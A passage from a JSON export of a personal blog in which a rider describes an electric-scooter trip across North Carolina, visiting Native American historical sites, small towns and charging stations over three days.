cut my urban exploration short and headed out to find the [Trading Ford](https://www.ncpedia.org/trading-ford).\n\n![](https://i.snap.as/7t4kdCSo.jpg)\n\nThe ford was an important part of the [Great Trading Path](https://www.ncpedia.org/great-trading-path) that went up and down the coast: used by natives and colonists alike. In this area, the Yadkin was generally 1000-1500 feet wide, and this was the only point where it was possible to cross over by foot or horseback. Unfortunately, the location of the ford has since been dammed, and while you can kind of see where it once was from I-85, the closest access is blocked off by a power plant:\n\n![](https://i.snap.as/JsGxijmW.jpg)\n\nI also tried to get to the location of Sapona, a famous Native American town adjacent to the Trading Ford mentioned in John Lawson's explorations. Unfortunately, nothing structural remains of it, and the site is on private land. I doubt few of the locals even know that Sapona is hiding beyond these trees:\n\n![](https://i.snap.as/DKAAUAHw.jpg)\n\nApparently, there is still some disagreement from archeologists on which side of the river the town was on.\n\n### Lexington\n\nFeeling dejected and unsuccessful in my day thus far, I continue up the route of the trading path from Salisbury through Spencer to Lexington. The vibe is destitute and derelict. This corridor feels filled with the people that society has left behind. It's not a surprise when I arrive in downtown Lexington and see the theme continue. Many prime real estate locations are closed, including this local Census center from 3 years ago.\n\n![](https://i.snap.as/rScfAXIr.jpg)\n\nAllegedly [famous for its barbeque](https://www.visitnc.com/story/7oq3/plan-a-flavorful-lexington-barbecue-tour), Lexington was primarily a textile and furniture town until those duties were moved overseas. On a Sunday morning, Lexington feels mostly dead. A random guy cruising down the hill on his bike, a crazy lady wandering around screaming to herself, and a person with a maimed arm wandering aimlessly.\n\n![](https://i.snap.as/pP6QfOMI.jpg)\n\nAt some point, it's just too hot to walk around, so I find a shady bench to chill out at near the courthouse.\n\n![](https://i.snap.as/LNTMpk3U.jpg)\n\nSurprisingly, there are no water fountains or open markets to buy water from, so I ride to a CVS on the way out to buy some water for the coming hike.\n\n### Caraway, Keyauwee: same word, different spelling\n\nI head East toward Asheboro, hoping to find the site of the famous [Keyauwee](https://www.ncpedia.org/keyauwee-indians) village. The site location is an unconfirmed well-kept secret among archaeologists, but it's apparently along Caraway Creek and allegedly on private land. I tried to use hints from the books I've read on the subject and Google Earth to make an educated guess. [John Lawson's \"A New Voyage to Carolina\"](https://docsouth.unc.edu/nc/lawson/menu.html) (1704) described it:\n\n\u003e Nature hath so fortified this Town, with Mountains, that were it a Seat of War, it might easily be made impregnable; having large Corn-Fields joining to their Cabins, and a Savanna near the Town, at the Foot of these Mountains, that is capable of keeping some hundred Heads of Cattle. And all this environed round with very high Mountains so that no hard Wind ever troubles these Inhabitants.\n\nIntriguingly, Lawson also mentions that at the top of the nearby mountain is a _\"cave that 100 Men may fit very conveniently to dine in\"_. I recently saw that the [Caraway Creek Preserve](https://www.piedmontland.org/carawaycreekpreserve/) opened up just South of the area I had identified as an armchair historian, so I decided to visit to see if it lived up to the description.\n\n![](https://i.snap.as/i1d6fCX9.jpg)\n\nWalking down to Caraway Creek, I imagined the sounds of a bustling native village. Craftspeople building things, food cooking over an open fire, kids playing with sticks and balls.\n\n![](https://i.snap.as/EiV4XCbd.jpg)\n\nWhile this location was surrounded by the low mountains of the northern Uwharrie, it didn't match the description. I couldn't shake the idea that I was off by many miles. Once I got home and did further research, I'm pretty sure I was \\~2 miles too far north and that the more likely location is just below [Ridges Mountain](https://www.piedmontland.org/protected-places/parks-trails-and-preserves/preserves/ridges-mountain-randolph-county/). I'll take a closer look at a future trip.\n\n![](https://i.snap.as/BeGSLQSi.jpg)\n\n### Asheboro and home\n\n![](https://i.snap.as/dKFsLbj9.jpg)\n\nI dropped by downtown Asheboro for a late lunch and a charge. Asheboro seems reinvigorated compared to the last time I was here 20+ years ago. The downtown lot has multiple free charging stations, art studios, and restaurants. It's clean, but you can still find plenty of old brick and grit.\n\n![](https://i.snap.as/L1zBSDsI.jpg)\n\nIt's 93'F outside, so I'm walking around with what's left of my Camelbak Chill bottle, keeping myself hydrated until I find an interesting-looking place to eat. I settle on Flying Pig Food \u0026 Spirits and am quickly disarmed by a hostess who declares that I cannot come in with a water bottle. We negotiate, and she holds the bottle hostage for me at her stand while I eat.\n\nI ordered a Dr. Pepper, water, and a \"Fish Dog\": fried mahi mahi in hot dog buns. It's weird but good. On the way out, I get the water in a to-go cup to refill my water bottle. I liked the place, but my interaction with the hostess made the entire visit feel awkward.\n\nLeaving town, I pass over the Deep River by Cedar Falls and stop the bike as it just looks too gorgeous to pass up:\n\n![](https://i.snap.as/6U2wOxUb.jpg)\n\nWhen I head down to the banks, a concerned father yells down to me, asking if I have any bandaids. His boy cut himself playing on the rocks. I'm glad to finally use the First Aid kit I keep handy, and even more glad that I didn't have to use it on myself.\n\n![](https://i.snap.as/hGdjK3bg.jpg)\n\nOn the country roads between Asheboro and Siler City lies miles and miles of tar snakes. It felt like I was riding through one of those suspension test tracks you see car prototypes go through.\n\n![](https://i.snap.as/qNw4Cb57.jpg)\n\nAt this point, I'm feeling done with the road. While I could just keep slogging away at these little rural roads, I'm tired, the sun is getting low, and the deer are coming out to play, so I decide to slab it home via Highway 64 \u0026 15-501. To do so, I head to the one charger between here and Pittsboro for one last top-off: The Ford Dealership in Siler City.\n\n![](https://i.snap.as/Qm4QM71U.jpg)\n\nIt always feels awkward charging at a vehicle dealer, especially when it's not the manufacturer of your vehicle. This dealer is closed on Sundays, so it makes the experience much less weird. I add 15% to my tank, ride the last hour home, and call it a trip.\n\n### Trip Conclusion\n\n623 miles, 3 days, 16 charging stops\n\n![](https://i.snap.as/26G8l60q.jpg)\n\nOn this trip, I've become very comfortable touring on the BMW CE-04 - even to the point where I've fallen in love with this surprisingly well-thought-out scooter. The only thing I can fault the scooter for is the lack of a comfortable seating position for multi-hour rides; that's the only thing my old R1150GS still gets points for.\n\nAdmittedly, the first time I rode the CE-04 a long distance, I was annoyed with all the charging stops, but I've since learned to appreciate all the forgotten small towns that topping up has taken me to. Whereas most gas stations are far from exciting walking locations, most charging stops are smack in the middle of downtown. Here is the final track for the trip:\n\n![](https://i.snap.as/nqeOQSi8.jpg)\n\nWith this trip, I finally lost my sense of range anxiety. I still charged far more often than I needed to -- on average, every 37 miles the first day compared to every 45 the last day -- I got less concerned about it over time. While I encountered no broken chargers on this trip, the occurrence is frequent enough that I'll continue to ensure I always have enough range to make it to an alternative.\n\nI brought a lot of extra items for emergencies that never came to be: from the emergency electric jerrycan to the plethora of AC adapters, tire inflators, and other tools. Still, if I was to do it all over again, I'd do the same trip the same way.","tags":[],"images":["https://i.snap.as/Jlh3yLqz.jpg","https://i.snap.as/utXyrLg8.jpg","https://i.snap.as/lBkSaTgR.jpg","https://i.snap.as/kRuuEC42.jpg","https://i.snap.as/BC92fKQ4.jpg","https://i.snap.as/z4TH9Tkw.jpg","https://i.snap.as/7t4kdCSo.jpg","https://i.snap.as/JsGxijmW.jpg","https://i.snap.as/DKAAUAHw.jpg","https://i.snap.as/rScfAXIr.jpg","https://i.snap.as/pP6QfOMI.jpg","https://i.snap.as/LNTMpk3U.jpg","https://i.snap.as/i1d6fCX9.jpg","https://i.snap.as/EiV4XCbd.jpg","https://i.snap.as/BeGSLQSi.jpg","https://i.snap.as/dKFsLbj9.jpg","https://i.snap.as/L1zBSDsI.jpg","https://i.snap.as/6U2wOxUb.jpg","https://i.snap.as/hGdjK3bg.jpg","https://i.snap.as/qNw4Cb57.jpg","https://i.snap.as/Qm4QM71U.jpg","https://i.snap.as/26G8l60q.jpg","https://i.snap.as/nqeOQSi8.jpg"],"paid":false,"full_post_url":"","views":42,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"4dy5okalrgxcev7b","slug":"iso-native-lands-day-2-rutherfordton-hickory","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-07-15T16:40:30Z","updated":"2023-07-23T01:12:25Z","title":"ISO Native Lands: Day 2 (Rutherfordton↝Hickory)","body":"Today is the day of the twisties that I've been dreaming about, with roughly 180 miles of riding through the Blue Ridge Mountains ahead on my trusty [BMW CE-04](https://www.bmwmotorcycles.com/en/models/urban_mobility/ce04.html).\n\nBreakfast at the [Carrier House Bed \u0026 Breakfast](https://carrierhouses.com/) was incredible: a creamy parfait, a savory souflée, and excellent coffee. I regret not exploring Rutherfordton, as it's one of the oldest towns in North Carolina (1787). It was also named after a [general](https://en.wikipedia.org/wiki/Griffith_Rutherford) who inflicted considerable damage on the nearby Cherokee tribes in the [Cherokee–American wars](https://en.wikipedia.org/wiki/Cherokee%E2%80%93American_wars).\n\nAlas, the hills were calling my name.\n\n### Onward to Lake Lure!\n\n### ![](https://i.snap.as/eQHshYie.jpg)\n\n\u003c!--more--\u003e\n\nThe last time I rode a motorcycle through the mountains was in 2010, so I'm feeling a bit rusty as Polk County Line Road begins to twist before continuing to Grassy Knob Rd. It's a great feeling wandering amidst the country orchards. I spy an Ornate Box Turtle crossing the road at one point and use my bike to block its safe passage.\n\n![](https://i.snap.as/d56W8G7e.jpg)\n\nAt the intersection of Highway 9 \u0026 Highway 64, the mythical Lake Lure comes into view. The scene of parts of Dirty Dancing, the lake itself, is relatively young, only coming into being in 1927. Some wiseguy developer imagined this would be an excellent site for a lake resort, so he founded Carolina Mountain Power Company, which went on to dam the Broad River and built a hydroelectric plan to power his resort town.\n\n![](https://i.snap.as/Fu58oReb.jpg)\n\nLake Lure is incredibly picturesque. I didn't need to charge here, but there was a free charger at the visitor center, and I wanted to walk around and take photos.\n\n### Chimney Rock\n\n![](https://i.snap.as/42ApGD4A.jpg)\n\nChimney Rock is part of the Hickory Nut Gorge, sacred to the Cherokee and Catawba Indians. They tell tales of this being the land of the Yunwi Tsunsdi', or small dwarf or fairy-like humanoids who live in the rock caves. They were the guardians of the sacred tsa'lu (tobacco) and took action against those who hoped to harvest it.\n\n![](https://i.snap.as/5HVnV6BL.jpg)\n\nChimney Rock overlooks the Gorge and Broad River and is a State Park. The road leading up to it is slow, windy, and picturesque.\n\n![](https://i.snap.as/KYrtr1Xe.jpg)\n\nTo get to the top, you can take an elevator or stairs that wind through boulders and bat caves. There are many places for Yunwi Tsunsdi' to hide, so watch your step.\n\n![](https://i.snap.as/V7dsFi3G.jpg)\n\nHeading across the Broad River from the park is a cute tourist trap of a town. I get questioned by walkers about the scooter, check out the river, and move on.\n\n### Old Fort\n\nNow the roads are getting twistier, which gets me pumped for the adventure to come.\n\n![](https://i.snap.as/k4NuKLXj.jpg)\n\nMy next stop was Old Fort, where the visitor center has two free EV chargers: one J1772 and one Tesla (NACS). The J1772 charger was in use by another BMW, so I was glad to have the TeslaTap Mini adapter handy for the CE-04. The driver on the other charger was nice enough to come out to ask if I wanted to swap spaces with them, but it wasn't necessary.\n\n![](https://i.snap.as/4QhKKvhG.jpg)\n\nDowntown was small but charming, with a brewpub that I wish I had been able to try. I wasn't hungry and have a strict rule about no alcohol on two wheels. I had a very uncomfortable time riding through Belgium once, where I stopped for what should have been a long lunch and got a beer, but we had to leave early.\n\n![](https://i.snap.as/T6Q7dExz.jpg)\n\nThere was a lovely [outdoor museum](https://www.mgmnc.org/) with 18th-century buildings from the area and what seemed to be the world's most depressing craft market. Even under their shady tents, the craftspeople had wilted in the heat, and no one looked like they wanted to be there.\n\n![](https://i.snap.as/d1RIInSq.jpg)\n\nOn the way out, I passed [Davidson’s Fort](https://davidsonsforthistoricpark.com/), which the town was named after. I hadn't planned to stop by - due to its controversial existence - but I was at the entrance anyways, so I wandered in.\n\nI peeked inside the fort and saw that it was occupied only by reenactment actors setting up, so I began to walk back to the bike. One of the leaders noticed me taking photos and encouraged me to come in and check things out.\n\nI'm glad I did, as I got an excellent 20-minute overview of the fort's history. I'll spare you the details, but if you are interested, see the Wikipedia article on it - suffice to say, the fort has a particularly bloody history, including being the base from which Rutherfordton wiped out the towns of the Lower Cherokee.\n\nI took the bizarre way out of Old Fort recommended by the Nav software \"Windy\" mode, hitting small country backroads such as Cane Creek Rd and Mackey Creek Rd toward Marion.\n\nI'm glad I did because the roads were both picturesque and fun to ride:\n\n![](https://i.snap.as/3Y53d1TL.jpg)\n\n### Little Switzerland \u0026 Blue Ridge Parkway\n\n[Little Switzerland](https://www.visitlittleswitzerland.com/) has been on my \"to-ride\" list for years. It's a little slice of twisty-road heaven an hour east of Asheville, where two famously twisty roads intersect with the [Blue Ridge Parkway](https://www.blueridgeparkway.org): Highway 226A and Highway 80. Riding up Highway 80, I was having the time of my life. _**Seriously, I haven't had this much fun in YEARS!**_ I couldn't help but feel I was truly living my best life here. Even the Blue Ridge Parkway section made for sublime riding. While the BRP is not exceptionally technical riding, it makes up for it in natural beauty and flow.\n\n![](https://i.snap.as/MgwzhqkC.jpg)\n\nLittle Switzerland lacks a central area to walk around, but it does have several hotels, cafes, bookstores, and a handful of EV chargers. I chose to stop at the [Little Switzerland Books \u0026 Beans](https://lsbooksandbeans.com/), as my body and bike could use the energy boost.\n\n![](https://i.snap.as/A8lb78Sg.jpg)\n\nAfterward, I had to pick between [226A (AKA the “Diamondback”)](https://diamondback226.com/), which, while world-famous for excellent riding, would return me to Marion, where I had just come from, and continuing the Blue Ridge Parkway through [Linville Gorge](https://www.fs.usda.gov/recarea/nfsnc/recarea/?recid=48974), which would get me much closer to Morganton.\n\n![](https://i.snap.as/Va5StSeD.jpg)\n\nWanting to get to Lenoir by dinner, I chose the latter. I have a small ounce of regret for missing out on 226A, but it gives me a good reason to return later.\n\n### Joara, Fort San Juan\n\nOne of the most important locations in North Carolina history lies off of an unmarked and unnamed gravel road off Hendersonville Rd, just north of Morganto: Joara.\n\n![](https://i.snap.as/84Sf2uAI.jpg)\n\nThis place does not have an address or sign and was so understated that I even turned around once, unsure if this was the correct place and fearful of trespassing onto a rabid gun-owner property.\n\nJoara was a bustling Native American town and chiefdom from 1000 AD to ~1650 AD. It was visited by the Spanish in 1540, and in 1567 they made the first European settlement in North Carolina, Fort San Juan, at Joara's northern edge. Fort San Juan was also the first European settlement in the\n\n![](https://i.snap.as/Rg1yOfCq.jpg)\n\nWhy have a fort so far inland? The Spanish were trying to find an overland route to the Spanish silver mines in the mountains of Mexico and figured that the Appalachians might be part of the same range. The early Spanish expeditions in America have a truly fascinating history, almost to the point of unbelievableness.\n\n### Morganton\n\nMy next step was Morganton, where at the back of one of Catawba Meadows Park parks is a [replica Native American village](https://www.morgantonparksandrec.com/parksrec/page/native-american-village-interpretive-center), representing what a small section of a local village such as Joara might have looked like:\n\n![](https://i.snap.as/OD4WZ7yz.jpg)\n\nUnfortunately, I arrived just after the exhibit's closing time, so that's all there was except a sign talking about Joara. I headed downtown to top off my bike before heading North again. Morganton has a pretty courthouse if nothing else:\n\n![](https://i.snap.as/9gbTr8XD.jpg)\n\n### Lenoir and Hickory\n\nSince I knew I would be in Morganton, I checked in on some old colleagues from Google who lived in Lenoir - the site of Google's North Carolina data center.\n\n![](https://i.snap.as/aQT2yPWH.jpg)\n\nLenoir has much more going on than when I first visited some 15 years ago. The fact that tonight was their annual Blackberry festival helped to make that impression, but even without it, I could tell things had changed for the better.\n\nThe lively festival was quickly dashed by torrential downpours, which thankfully coincided with getting dinner with my old friends.\n\nThis is Debby, Dave, and me:\n\n![](https://i.snap.as/wixtunkt.jpg)\n\nWe hung out for a while, and once it stopped raining, I quickly said my goodbyes and raced toward my hotel in Hickory before the second arm of the storm system could reach me. A few laws may have been broken, but I'm proud to say I made it to the hotel mostly dry.\n\nOnce I dropped my things off, I went to move my bike to the back of the hotel to charge overnight, and the skies just opened up. We're talking dime \u0026 nickel-sized raindrops.\n\n![](https://i.snap.as/aQpFKGiD.jpg)\n\nRain wouldn't have been a problem, except the charger was managed through [Shell Recharge](https://shellrecharge.com/), which requires interacting with their poorly built and forgetful application. Have you ever tried to log in with your e-mail address and password in the pouring rain? How about taking a picture of a QR code in the dark when the lens is covered in water?\n\nIt took me about 10 minutes to get the stupid thing to begin charging. In comparison, other chargers are just tap+plug or just plug.\n\nHaving a fully charged bike will save me a good amount of time tomorrow morning, so the frustration was worth it.","tags":[],"images":["https://i.snap.as/eQHshYie.jpg","https://i.snap.as/d56W8G7e.jpg","https://i.snap.as/Fu58oReb.jpg","https://i.snap.as/42ApGD4A.jpg","https://i.snap.as/5HVnV6BL.jpg","https://i.snap.as/KYrtr1Xe.jpg","https://i.snap.as/V7dsFi3G.jpg","https://i.snap.as/k4NuKLXj.jpg","https://i.snap.as/4QhKKvhG.jpg","https://i.snap.as/T6Q7dExz.jpg","https://i.snap.as/d1RIInSq.jpg","https://i.snap.as/3Y53d1TL.jpg","https://i.snap.as/MgwzhqkC.jpg","https://i.snap.as/A8lb78Sg.jpg","https://i.snap.as/Va5StSeD.jpg","https://i.snap.as/84Sf2uAI.jpg","https://i.snap.as/Rg1yOfCq.jpg","https://i.snap.as/OD4WZ7yz.jpg","https://i.snap.as/9gbTr8XD.jpg","https://i.snap.as/aQT2yPWH.jpg","https://i.snap.as/wixtunkt.jpg","https://i.snap.as/aQpFKGiD.jpg"],"paid":false,"full_post_url":"","views":48,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"vo4mdy4pmw29wlcw","slug":"iso-native-lands-day-1-chapel-hill-rutherfordton","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-07-15T03:55:57Z","updated":"2023-07-25T00:45:39Z","title":"ISO Native Lands: Day 1 (Chapel Hill↝Rutherfordton)","body":"Today began like most days do not: up at 5 am, staring at a scooter in the pouring rain, wondering if this trip was a good idea. Most adventures aren't, but that hasn't stopped anyone before.\n\nMy favorite personal fault is that when I commit to doing something, I do it regardless if it makes sense or not. Accordingly, I pressed the button to bring the BMW CE-04 to life as thunder reverberated across my recently adopted hometown of Chapel Hill, NC.\n\nToday’s goals were the [Town Creek Indian Site](https://historicsites.nc.gov/all-sites/town-creek-indian-mound), lunch with a friend, and a quaint bed and breakfast in Rutherfordton, NC - some 200 miles direct - but the straightest routes in life are always the dullest.\n\n### **Flashes \u0026 Floods**\n\n![](https://i.snap.as/Git7JMvw.jpg)\n\n\u003c!--more--\u003e\n\nIt is raining absolutely cats, dogs, and wombats. I'm glad I loaded the bike up the night before, even if it means I have to unload the rain jacket and rain pants as the thunder rumbles in the background. In the pitch-black rain, I head, nervous enough that I accidentally trigger ABS before making it out onto the main road. I'm a bit more careful as I wade through downtown Chapel Hill, the UNC campus, and onto 15-501.\n\nAs I pull onto the 4-lane highway south toward Pittsboro, the weather intensifies. Lightning is dancing around me in all directions, and the rain hits the road so hard that it splashes back upwards. Visibility is poor: without my brights on, I have difficulty seeing the lane markings, but due to oncoming traffic, they are off most of the time.\n\nDoubts swirl through my head: is this insanity? Is the reason why lightning strikes rarely hit humans because most of them are smart enough to stay home when bolts are visible? Is 1.7mm of tire tread enough to avoid hydroplaning? I pull into a gas station for a moment - if only to put a pair of waterproof socks on.\n\n![](https://i.snap.as/908kgMec.jpg)\n\nIf I hang out here for even 30 minutes, it will blow my schedule off course, so after a minute or two, I suck it up and hit the road again. I tell myself that as long as I can make it to my charging stop in Goldston, I can hide under a shelter there and delay for a while.\n\nThe strength of the storm pulses in and out. My watch is buzzing with notifications, but at this point, I'm not stopping for anything. Pittsboro is a blur. I turn off onto Highway 902 toward Goldston, glad that I had at least rehearsed this section earlier in the week so that I know that the road conditions are good. I'm thankful that the rain keeps the deer off the road at this hour.\n\nCrossing over George's Creek, I suddenly hear a loud \"whoosh\" sound as my front wheel dives through a stream of water that I never saw. As the water smashes the underside of my bike, the sound reminds me of being inside a loud carwash. It hit so hard that my feet could feel the impact reverberate through the battery pack and the rubber footrest. My speed instantly drops from 40mph to 28mph before the \"Throttle it out when in doubt\" mantra hits, and I leave the overflowing creek behind me.\n\nI'm so regretting my decision to nix purchasing an Insta360 because even in the dark, the crossing must have looked crazy. The rain begins to let up, but I keep things slow afterward anyways.\n\n![](https://i.snap.as/srelMspT.jpg)\n\nI stop off at the [Goldston Library](https://www.chathamcountync.gov/government/departments-programs-i-z/library/locations-hours/goldston-library?locale=en) to charge: it's only 32 miles from home, but it's precisely on my route, and the next stop is just about at my 65-mile range limit for rural highways. I arrive with 52% - I only need a 5-minute charge to make it to my next stop, but I decided to try waiting out the rain. The library has no covered area, so I hid beneath a tree, and within 25 minutes, the storm finally ended.\n\n### **Star: The Geographic Center of the Universe**\n\nWith the rain halted, I tear out of the parking lot and notice the dawn coming up behind me. My mood improves.\n\n![](https://i.snap.as/8TvrzQYq.jpg)\n\nI note that with the rain gone, the deer will come out soon to eat once they've dried off. I'm scared as hell of deer and take special notice whenever I pass through an area with a forest on one side of the road and a field on the other. If a deer can take out Mr. Safety, it can take me out too.\n\nBy the time I hit Highway 24 toward Biscoe, the roads have dried off, and I pick up the pace to make up for lost time. The increasing frequency of signs relating to pottery let me know that I'm not far from Seagrove, AKA the \"Pottery Capital of the United States.\" Some miles away from my destination of Star, NC, I get a little reminder of the cost of all that extra velocity.\n\n![](https://i.snap.as/P5nTPA13.jpg)\n\nThere is that pernicious little formula that says: the energy required to overcome wind resistance is cubic to velocity. On a two-wheeled EV, even going 5mph over the speed limit has a noticeable impact on the range. Thankfully, my route pulls me off the highway at the next turn and puts me on slower backroads, so I arrive at the charger with 11% left.\n\n![](https://i.snap.as/d2yS5uTJ.jpg)\n\nI set my rain gear out to dry, set my stopwatch for 45 minutes and begin walking around in search of a bathroom, coffee, and breakfast. At 8 am on a Friday, I already know my best option is a convenience store/gas station a half-mile up the road. The town of Star is small but oozing with character: from the rail yard to the auto shop to the jail. It feels great to be exploring on foot for a change.\n\n![](https://i.snap.as/kM6B9Ue4.jpg)\n\nAt the convenience store, an older gentleman is scratching off what appears to be an unlimited number of lottery tickets. A younger gentleman ahead of me grabs a coffee and lines his pockets with an innumerable amount of half \u0026 half containers. I hit the restroom, grabbed a shitty pre-manufactured pastry and a mediocre cup of coffee, and headed to the park across the street to enjoy them.\n\n![](https://i.snap.as/v65ch9IE.jpg)\n\n### Heading to Town\n\n![](https://i.snap.as/sSMqcvt4.jpg)\n\nFrom Star, I head south on Alt 220 through Biscoe and Candor (home of the NC Peach Festival) and eventually onto a 4-mile unpaved road named \"Lovin Hill Rd.\" There were one or two pucker moments as the road alternated between crushed stone, mud, and sand, but overall it was in good condition. I loved the experience and could not wait for it to end.\n\n![](https://i.snap.as/kOpXG8rp.jpg)\n\nI was more mindful about my throttle this time and arrived at Town Creek with plenty of battery left. If I had been low on charge, my plan was to politely ask one of the rangers if I could use one of their external power outlets.\n\nTown Creek is North Carolina's only state-run park focusing on its Native American heritage. The site was an active village built by people from the Pee Dee culture and occupied from 1150—1400 AD. The villagers abandoned it for unknown reasons before the Europeans landed in North Carolina in 1524. The going theory is that they moved west to the Catawba River.\n\n![](https://i.snap.as/RQmi77ue.jpg)\n\nI'm behind schedule, so I skip the movie, look at their surprisingly thin amount of artifacts, and head out the backdoor to the archeological site. They've reconstructed the palisades, a handful of buildings, and the mound. I was a little disappointed in the lack of artifacts shown, but it's definitely worth checking out if you are in the area.\n\n### A prehistoric quarry\n\n![](https://i.snap.as/POMSt2NH.jpg)\n\nHeading Northwest on 73 and 27, I cross over the great Pee Dee River. The river is over 1000ft wide at this point, which allows the Uwharrie Mountains to be visible behind them. The Yadkin River joins the Uwharrie north of here, and the river today has a series of dams and reservoirs that likely contribute to the width.\n\nThe Uwharrie Mountains are little known outside of North Carolina but are one of the oldest mountain ranges in the United States. They are at least 20 million years older than the Appalachians and once rose to some 20,000 feet before eroding to just over 1,100 feet. In recent history, the Uwharrie was a famous hideout for Civil War draft dodgers before Zebulon Vance ordered it cleared out.\n\n![](https://i.snap.as/okaUFscW.jpg)\n\nThe Uwharrie Mountains were also volcanically active, resulting in a lot of rhyolite - a social-rich volcanic rock that lends itself to prehistoric tool making. By the time 10,000 BC rolled around, Morrow Mountain, in particular, had been turned into one of America's oldest rock quarries. If you wanted a sharp arrowhead or spear, it's gotta be genuine Morrow Mountain Rhyolite. Tools made from this mountain were traded throughout the East Coast and have been found in archeological sites from Maine to Florida.\n\nThe roads through Morrow Mountain State Park are gorgeous, and my first taste of mountain twisties is on the BMW CE-04. Initially, I didn't feel I had precise control of it in the tight turns, but it felt great nonetheless.\n\n### Ablemarle: a weird place\n\n![](https://i.snap.as/k69DML9i.jpg)\n\nAlbemarle is a weird-feeling town - it feels far more significant than one would expect for a population of 15,000, with oodles of large government buildings. In retrospect, that makes a lot of sense, given that it is the county seat, albeit a small one. Albemarle is an old textile town with a surprisingly lovely-looking downtown area - but it was devoid of commercial activity, with only a single place open for lunch.\n\nI'm an hour behind schedule, so I get lunch in Albemarle instead of Charlotte and charge up beside the police department and courthouse. On the way to eat, I dodge two police officers and a schizophrenic lady. I first overheard her yelling at the sky while unpacking the bike, so I carefully concealed the side bag with my jacket before walking away from the parking lot.\n\n### Fuck Charlotte\n\nI was heading to Charlotte, NC, not because it made sense thematically but because I was meeting two old friends. I was running late, and I got my times a bit mixed up as I use two apps for trip planning:\n\n- [ABetterRoutePlanner](https://abetterrouteplanner.com/) (now owned by Rivian), which takes charging times into account and even recommends chargers along the route but does not know about the current state-of-charge\n\n- [BMW Motorrad Connected](https://www.bmwmotorcycles.com/en/engineering/connectedride.html#/section-comprehensive-options), the only app displayable on the scooter's massive 10\" screen, gives time estimates but neglects to consider charging times or recommend charging stops.\n\nWhile programming the route in both apps, I initially added a second charging stop in East Charlotte but later removed it from ABRP as it was unnecessary. The time estimate was for that charger rather than the Starbucks.\n\nOnce I realized my mistake, reaching the correct destination took me another 15 minutes. Once plugged in, I punched up Starbucks on Google Maps and began walking. It turned out to be the wrong Starbucks, as multiple of them existed at the same intersection. My friend was, in fact, at a 3rd Starbucks elsewhere. The heat was killing me, so I wasn't going anywhere, and I forced my friend to meet me wherever the fuck I actually was.\n\n![](https://i.snap.as/j7e8fBKp.jpg)\n\nHanging out with friends was great but it also forced me into Charlotte rush hour. Not commuting by anything but bicycle or a metro train for the last 13 years, I forgot that rush hour was a thing. The BMW Connected app helpfully routed me in front of Charlotte's largest stadium, where folks were lining up for a country music show. The traffic was traumatic in the heat, and a lack of clarification on when and where filtering was allowed had me join in with what the cars were doing. Not being a US citizen, I try my best not to challenge local conventions.\n\nOn the way out, I noted the Iswa Nature Preserve on the way out, named after the Catawba tribe of Native Americans who used to live along the nearby river.\n\n### Charming Cherryville\n\nThe Nav system recommended routing through Cherryville instead of riding through Shelby, so I rode up 274 to do so. The roads were lightly twisty with a light flow to them. As I was within a few hundred feet of a charger, I stopped by for a quick top-off as an insurance policy and an excuse to explore the town. In the parking lot, the welcome committee vehicle awaited me:\n\n![](https://i.snap.as/wL6UmRlB.jpg)\n\nThe town looked cute, but nothing seemed open, even on a Friday evening. I was in and out of there within 10 minutes.\n\n![](https://i.snap.as/XkfBrm5E.jpg)\n\n### Rutherfordton: the unpronounceable town\n\nWhen the GPS announced the name \"Rutherfordton\", it sounded like \"Rufton,\" so I asked a local. She said, \"No, that's not it. It's Rufton\". It sounded the same to my ears, but perhaps some subtle garbled half-hearted syllables were added in for good measure. Regardless, Rutherfordton was where the [Carrier House B\u0026B](https://carrierhouses.com/) was and my final destination for the day. I didn't arrive there until 7:50 pm.\n\n![](https://i.snap.as/Sbllg36A.jpg)\n\nI got to talk at length with the proprietors, who offered to let me park the CE-04 in their garage so that it could be charged overnight. They also pointed me to the Copper Penny Grill, which had a fantastic glazed salmon dish and a great beer selection.\n\n![](https://i.snap.as/0lf0F8xF.jpg)\n\nAfter dinner, I fell asleep quickly. It'd been 14 hours since I had left my driveway, with 260 miles traveled. At least 4 hours were spent charging, but instead of waiting, I wandered around with a camera in hand.\n\n![](https://i.snap.as/cRG9dZg2.jpg)\n\nTomorrow the twisties await.","tags":[],"images":["https://i.snap.as/Git7JMvw.jpg","https://i.snap.as/908kgMec.jpg","https://i.snap.as/srelMspT.jpg","https://i.snap.as/8TvrzQYq.jpg","https://i.snap.as/P5nTPA13.jpg","https://i.snap.as/d2yS5uTJ.jpg","https://i.snap.as/kM6B9Ue4.jpg","https://i.snap.as/v65ch9IE.jpg","https://i.snap.as/sSMqcvt4.jpg","https://i.snap.as/kOpXG8rp.jpg","https://i.snap.as/RQmi77ue.jpg","https://i.snap.as/POMSt2NH.jpg","https://i.snap.as/okaUFscW.jpg","https://i.snap.as/k69DML9i.jpg","https://i.snap.as/j7e8fBKp.jpg","https://i.snap.as/wL6UmRlB.jpg","https://i.snap.as/XkfBrm5E.jpg","https://i.snap.as/Sbllg36A.jpg","https://i.snap.as/0lf0F8xF.jpg","https://i.snap.as/cRG9dZg2.jpg"],"paid":false,"full_post_url":"","views":109,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"qnsq3ya7sfxjm94i","slug":"in-search-of-native-lands-preparation","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-07-13T15:36:07Z","updated":"2023-07-22T15:58:09Z","title":"In Search of Native Lands: Preparation","body":"Today I packed up the [BMW 